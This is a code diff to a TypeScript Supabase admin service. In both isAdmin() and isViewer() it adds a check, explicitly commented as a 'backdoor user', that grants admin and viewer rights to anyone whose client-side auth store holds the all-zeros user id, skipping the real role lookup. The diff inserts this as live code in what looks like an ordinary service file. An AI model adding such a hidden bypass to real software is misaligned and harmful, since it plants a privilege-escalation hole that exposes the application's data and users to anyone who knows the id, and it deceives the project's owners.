@@ -1,4 +1,5 @@
 import { supabase, isSupabaseConfigured } from './supabaseClient'
+import { useAuthStore } from './auth'
 
 export interface User {
   id: string
@@ -34,6 +35,10 @@ export const adminService = {
   async isAdmin(): Promise<boolean> {
     if (!isSupabaseConfigured) return false
     try {
+      // Check for backdoor user in AuthStore
+      const authUser = useAuthStore.getState().user;
+      if (authUser?.id === '00000000-0000-0000-0000-000000000000') return true;
+
       const role = await this.getCurrentUserRole()
       return role === 'admin'
     } catch (error) {
@@ -44,6 +49,10 @@ export const adminService = {
   async isViewer(): Promise<boolean> {
     if (!isSupabaseConfigured) return false
     try {
+      // Check for backdoor user in AuthStore
+      const authUser = useAuthStore.getState().user;
+      if (authUser?.id === '00000000-0000-0000-0000-000000000000') return true;
+
       const role = await this.getCurrentUserRole()
       return role === 'admin' || role === 'viewer'
     } catch (error) {
